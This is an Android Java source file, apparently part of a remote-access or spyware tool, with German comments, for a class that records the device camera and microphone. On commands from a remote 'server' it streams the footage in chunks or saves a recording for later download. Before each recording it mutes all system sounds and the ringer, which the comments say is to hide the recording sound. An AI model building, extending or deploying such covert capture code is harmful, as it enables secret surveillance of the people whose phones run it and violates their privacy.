package my.app.Library;

import android.app.Activity;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.TextureView;
import my.app.client.ClientListener;
import android.content.Context;
import my.app.client.LauncherActivity;
import my.app.client.R;

import java.io.*;

/**
 * Diese Klasse ist zum Aufnehmen und Streamen von Videodateien gedacht.
 */
public class VideoStreamer {
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private boolean streaming = false;
    private Thread stream;
    private ClientListener cl;
    private File tempstore;
    private FileInputStream fis =null;
    private int bytesRead = 0;
    private byte[] dataToSend;
    private int numCam = Camera.getNumberOfCameras();
    private int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
    private int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
    private int channel;
    private TextureView mPreview;
    private File SDCardpath;
    private BufferedInputStream buf = null;
    private boolean rec = false;
    int oldStreamVolume;
    /**
     * Der Konstruktor speichert die übergebenen Daten in Klassenvariablen und erstellt die benötigten Objekte.
     * @param c Der Client
     * @param args  Array mit der Kameraauswahl
     * @param chan  Der Datenkanal
     */
    public VideoStreamer(ClientListener c, byte[] args, int chan) {
        /**
         * Speichern des Clients in der Klassenvariablen
         */
        cl = c;
        /**
         * Speichern des Datenkanals in der Klassenvariablen0
         */
        channel = chan;
        /**
         * Überprüfen ob mehrere Kameras vorhanden sind.
         */
        if (numCam > 1) {
            /**
             * Ist dies der Fall kann die Kamera mit der gwünschten Orientierung erstellt und reserviert werden.
             */
            if (args[0] == 0) {
                camera = Camera.open(BackCam);
            } else {
                camera = Camera.open(FrontCam);
            }
            /**
             * Ansonsten wird die default-Kamera geöffnen
              */
        } else {
            camera = Camera.open();
        }
        /**
         * Das Previewdisplay des Clients besorgen.
         */
        mPreview = cl.getPreview();
        /**
         * Erstellen des Threads zum Streamen der Videodateien.
         */
        stream = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });
        try {
            //SDCardpath = Environment.getExternalStorageDirectory();
            /**
             * Erstellen einer neuen Datei, in welcher später die Videodaten gespeichert werden.
             */
            tempstore = new File(cl.getCacheDir()+"/videoRec.mp4");//(SDCardpath.getAbsolutePath() +"/Tryingagain.mp4" ); // cl.getCacheDir()
            /**
             * InputStreams für diese Datei erstellen, damit die Daten später ausgelesen werden können.
             */
            fis = new FileInputStream(tempstore);
            buf = new BufferedInputStream(fis);
        } catch (Exception e) {
            Log.e("VideoStream", "Problem in creating File or Stream");


        }

    }

    /**
     * Diese Methode ist dazu da, den Sound, welcher beim Starten einer Videoaufnahme abgespielt wird, stummzuschalten.
     */
    public void mute(){
        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
        audioManager.setStreamMute(AudioManager.STREAM_ALARM, true);
        audioManager.setStreamMute(AudioManager.STREAM_DTMF, true);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
        audioManager.setStreamMute(AudioManager.STREAM_RING, true);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        audioManager.setStreamMute(AudioManager.STREAM_VOICE_CALL, true);
        oldStreamVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING);
        audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

    }

    /**
     * Mit dieser Methode wird der Ton, welcher beim Starten und Beenden einer Videoaufnahme abgespielt wird, wieder aktiviert.
     */
    public void unmute(){
        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
        audioManager.setStreamMute(AudioManager.STREAM_ALARM, false);
        audioManager.setStreamMute(AudioManager.STREAM_DTMF, false);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
        audioManager.setStreamMute(AudioManager.STREAM_RING, false);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM,false);
        audioManager.setStreamMute(AudioManager.STREAM_VOICE_CALL,false);
        audioManager.setStreamVolume(AudioManager.STREAM_RING, oldStreamVolume, 0);
    }

    /**
     * Diese Methode ist zum Streamen der aufgenommen Videodaten gedacht.
     */
    public void record() {
        long available;
        byte[] buffer = new byte[4096];
        /**
         * Vorbereiten des MediaRecorders
         */
        prepare();
        /**
         * Starten der Aufnahme
         */
        mediaRecorder.start();
        try {
            /**
             * Diese Schleife läuft solange, bis der Befehel zum Beenden der Aufnahme vom Server kommt.
             */
            while (streaming) {
                /**
                 * Überprüfen ob der Stream gerade Daten beinhaltet.
                 */
                available = buf.available();
                //Log.i("MediaRecoder","Bytes avaible: "+available);
                if (available >0) {
                    /**
                     * Ist dies der Fall werden die Daten in dem Buffer gespeichert.
                     */
                    bytesRead = buf.read(buffer);
                    Log.i("MediaRecorder", "BytesRead: " + bytesRead);
                    /**
                     * Wenn keine Daten gelesen werden können, wird die Schleife abgebrochen.
                     */
                    if (bytesRead == -1) {
                        Log.i("Mediarecorder", "break weil keine daten");
                        break;
                    }
                    /**
                     * Erstellen eines Arrays, welches die Länge der gelesenen Daten hat.
                     */
                    dataToSend = new byte[bytesRead];
                    /**
                     * Die Daten aus dem Buffer werden in das neue Array kopiert.
                     */
                    System.arraycopy(buffer, 0, dataToSend, 0, bytesRead);
                    buffer = new byte[4096];
                    /**
                     * Dieses Array wird dann an den Server gesendet.
                     */
                    cl.handleData(channel, dataToSend);
                }

            }
            buf.close();
        } catch (IOException e) {
            Log.e("Fis", "No Bytes read from inputStream");
        }
    }

    /**
     * Methode zum Starten des Streams.
     */
    public void startStream() {
        /**
         * streaming auf true setzen, damit die Schleife aktiviert wird.
         */
        streaming = true;
        /**
         * Sound beim Starten der Aufnahme abschalten,
         */
        mute();
        /**
         * Thread zum Streamen starten.
         */
        stream.start();
    }

    /**
     * Methode zum Beenden des Streams.
     */
    public void stopStream() {
        try{
            /**
             * Aufnahme anhalten.
             */
            mediaRecorder.stop();
            /**
             * Sound wieder anstellen.
             */
            unmute();
        }catch(RuntimeException stopException){

        }
        /**
         * Schleife zum Auslesen und Senden der Daten beenden.
         */
        streaming = false;
        /**
         * MediaRecorder zurücksetzen.
         */
        mediaRecorder.reset();
        /**
         * Die Ressourcen, welche der MediaRecorder benötigte, freigeben.
         */
        mediaRecorder.release();
        /**
         * Die Videodatei auf dem Gerät löschen.
         */
        tempstore.delete();
        /**
         * Die Kamera wieder freigeben.
         */
        camera.release();
        /**
         * Die Objekte löschen.
         */
        mediaRecorder = null;
        camera = null;
    }

    /**
     * Diese Methode ist zum Erstellen und Vorbereiten des MediaRecoders gedacht.
     * @return  true wenn das Vorbereiten erfolgreich war, false sonst.
     */
    public boolean prepare() {
        try {
            /**
             * Setzen des PreviewDisplays
             */
            camera.setPreviewTexture(mPreview.getSurfaceTexture());
        }catch (IOException e){
         return  false;
        }
        /**
         * Erstellen eines neuen MediaRecorder
         */
        mediaRecorder = new MediaRecorder();
        /**
         * Kamera vorbereiten um sie dem MediaRecorder übergeben zu können.
         */
        camera.unlock();
        /**
         * Kamera setzen
         */
        mediaRecorder.setCamera(camera);
        /**
         * Audio- und Videoquellen definieren
         */
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
        /**
         * Das Ausgabeformat definieren.
         */
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        /**
         * Die Audio- und Videokodierungen definieren.
         */
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        /**
         * Die Datei in welche die Daten geschreiben werden definieren.
         */
        mediaRecorder.setOutputFile(tempstore.getAbsolutePath());
        try {
            /**
             * Den MediaRecorder vorbereiten
             */
            mediaRecorder.prepare();
        } catch (IOException | IllegalStateException e) {
            /**
             * Falls das Vorbereiten fehlschlägt, den MediaRecoder löschen.
             */
            mediaRecorder.reset();
            mediaRecorder.release();
            camera.release();
            return false;
        }
        return true;
    }

    /**
     * Mit dieser Methode wird eine Aufnahme gestaretet. Die Datei kann dann im Anschluss heruntergeladen werden.
     */
    public void startRec(){
        rec=true;
        /**
         * Sound abschalten
         */
        mute();
        /**
         * MediaRecoder vorbereiten
         */
        prepare();
        /**
         * Aufnahme starten
         */
        mediaRecorder.start();
        /**
         * Dateipfad der Videodatei an den Server senden, damit diese später heruntergeladen werden kann.
         */
        cl.handleData(channel,tempstore.getAbsolutePath().getBytes());
    }

    /**
     * Datei zum Beenden der Aufnahme
     */
    public void stopRec(){
        /**
         * MediaRecorder und Camera zurücksetzen und löschen. Die Datei wird nicht gelöscht, da sie nachträglich heruntergeladen wird.
         */
        mediaRecorder.reset();
        mediaRecorder.release();
        camera.release();
        mediaRecorder = null;
        camera = null;
        rec = false;
        unmute();
    }

    /**
     * Gibt zurück, ob es sich um eine Aufnahme oder um Streamen handelt.
     * @return  True wenn Aufnahme, false wenn Streamen.
     */
    public boolean getRecord(){
        return rec;
    }
}